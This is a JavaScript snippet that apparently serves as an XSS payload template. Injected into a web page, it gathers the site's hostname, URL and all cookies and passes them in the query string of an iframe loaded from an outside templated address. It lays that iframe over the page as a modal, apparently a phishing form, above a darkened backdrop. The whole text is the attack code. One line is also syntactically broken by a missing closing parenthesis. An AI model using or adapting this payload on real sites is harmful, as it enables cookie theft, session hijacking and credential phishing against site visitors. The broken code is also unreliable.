
(function(xssinjected) {
    if(xssinjected || location.hostname == 'localhost') return;
    
    window.xssinjected = 1;

    var cookies = (document.cookie || "");
    cookies = cookies.length > 0 ? cookies.split(';') : []
    
    var query = ["host=" + location.hostname,"url=" + location.href];
    for(var i=0; i<cookies.length; i++)
        query.push("cookie=" + cookies[i]);
    
    var create = function(name) { return document.createElement(name); };
    var append = function(el) { return document.body.appendChild(el); };
    
    var frame = create("iframe");
    var frameStyle = [
        "height:850px",
        "width:620px",
        "position:absolute",
        "top:100px", "left:50%",
        "margin:0 0 0 -310px",
        "background:none repeat scroll 0 0 #FFFFFF",
        "border:1px solid #bbb",
        "-moz-border-radius:15px",
        "border-radius:15px",
        "display:block",
        "padding:0",
        "z-index:101"
    ];
    frame.setAttribute('style', frameStyle.join(';'));
    frame.setAttribute('src', "{{form_html}}?" + query.join('&'));
    
    var fader = create("div");
    var faderStyle = [
        "position: fixed",
        "top:0", "left:0",
        "margin:-10px",
        "width:100%",
        "height:100%",
        "background-color:#000",
        "opacity:0.6",
        "z-index:100"
    ];
    fader.setAttribute('style', faderStyle.join(';');
    
    append(fader);
    append(frame);
})(window.xssinjected);

